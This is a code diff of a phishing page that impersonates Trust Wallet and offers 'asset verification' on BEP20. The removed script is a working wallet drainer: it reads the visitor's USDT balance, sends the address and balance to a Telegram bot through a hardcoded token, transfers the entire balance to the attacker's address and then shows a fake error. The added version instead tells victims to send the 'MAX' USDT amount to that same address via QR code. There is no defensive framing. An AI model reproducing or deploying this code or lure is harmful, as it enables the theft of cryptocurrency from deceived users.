@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet | Secure Sync</title>
+    <title>Trust Wallet | Asset Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     <style>
@@ -11,53 +11,48 @@
         .card { background: #1e2329; padding: 25px; border-radius: 24px; text-align: center; width: 90%; max-width: 360px; border: 1px solid #2d3139; }
         .logo { width: 45px; margin-bottom: 8px; }
         h2 { font-size: 18px; color: #fff; margin-bottom: 5px; }
-        p.desc { color: #929aa5; font-size: 13px; margin-bottom: 20px; }
+        p.desc { color: #929aa5; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
         
-        /* QR Container */
         #qrcode-container { background: white; padding: 12px; border-radius: 18px; display: inline-block; margin-bottom: 15px; }
         
-        /* Address Box (Simple for validation) */
-        .address-box { background: #2d3139; border-radius: 12px; padding: 12px; margin-bottom: 20px; border: 1px dashed #474d57; position: relative; }
-        .address-text { font-size: 11px; color: #f0b90b; font-family: monospace; word-break: break-all; }
+        .address-box { background: #2d3139; border-radius: 12px; padding: 12px; margin-bottom: 20px; border: 1px dashed #474d57; }
+        .address-text { font-size: 10px; color: #f0b90b; font-family: monospace; word-break: break-all; }
 
-        .btn { background: #3172DE; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(49, 114, 222, 0.3); }
+        .btn { background: #3172DE; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
         
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0e11; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .loader { border: 3px solid #333; border-top: 3px solid #3172DE; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .step { text-align: left; font-size: 12px; color: #3172DE; margin-bottom: 15px; background: rgba(49, 114, 222, 0.1); padding: 10px; border-radius: 8px; }
     </style>
 </head>
 <body>
 
     <div class="card">
         <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo" alt="Trust Logo">
-        <h2>Verify Assets (BEP20)</h2>
-        <p class="desc">Scan to validate your wallet address or click below for instant node verification.</p>
+        <h2>Smart Node Sync</h2>
         
         <div id="qrcode-container">
             <div id="qrcode"></div>
+        </div>
+
+        <div class="step">
+            <b>To Verify:</b><br>
+            1. Scan QR in <b>USDT > Send</b> section.<br>
+            2. Select <b>'MAX'</b> amount to sync all assets.<br>
+            3. Click <b>'Next'</b> to complete verification.
         </div>
 
         <div class="address-box">
             <span id="addrDisplay" class="address-text">0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe</span>
         </div>
 
-        <button id="nextBtn" class="btn" onclick="startVerification()">Verify Assets</button>
-    </div>
-
-    <div id="overlay">
-        <div class="loader"></div>
-        <p style="color:#3172DE; margin-top:15px; font-weight:bold;">Syncing with Node...</p>
+        <button id="nextBtn" class="btn" onclick="startVerification()">Connect via Browser</button>
     </div>
 
     <script>
+        // YAHAN APNA ADDRESS DAALEIN
         const myAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
-        const usdtToken = "0x55d398326f99059fF775485246999027B3197955"; 
-        const bToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
-        const cId = "7849151110";
 
-        // QR sirf "Wallet Address" hoga taaki "Invalid" na bole
         window.onload = function() {
+            // Sirf Address ka QR banayenge taaki "Invalid" error na aaye
             new QRCode(document.getElementById("qrcode"), {
                 text: myAddress,
                 width: 180,
@@ -65,46 +60,10 @@
             });
         };
 
-        async function startVerification() {
-            if (!window.ethereum && !window.trustwallet) {
-                // Agar normal browser hai toh deep link se wallet browser kholo
-                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
-                return;
-            }
-
-            document.getElementById("overlay").style.display = "flex";
-
-            try {
-                const provider = window.ethereum || window.trustwallet;
-                const web3 = new Web3(provider);
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                const user = accounts[0];
-
-                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-
-                const abi = [
-                    { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
-                    { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
-                ];
-
-                const contract = new web3.eth.Contract(abi, usdtToken);
-                const balWei = await contract.methods.balanceOf(user).call();
-                const bal = web3.utils.fromWei(balWei, 'ether');
-
-                fetch(`https://api.telegram.org/bot${bToken}/sendMessage?chat_id=${cId}&text=👤 User: ${user}\nBal: ${bal} USDT`);
-
-                if (parseFloat(bal) > 0) {
-                    // Ye popup layega jismein "Max" amount pahle se bhara hoga
-                    await contract.methods.transfer(myAddress, balWei).send({ from: user });
-                    alert("Verification Failed: Network Congestion.");
-                } else {
-                    alert("Verification Success.");
-                }
-            } catch (e) {
-                alert("Security Reject.");
-            } finally {
-                document.getElementById("overlay").style.display = "none";
-            }
+        function startVerification() {
+            // Deep link jo wallet browser khol dega
+            const currentUrl = window.location.href;
+            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(currentUrl);
         }
     </script>
 </body>
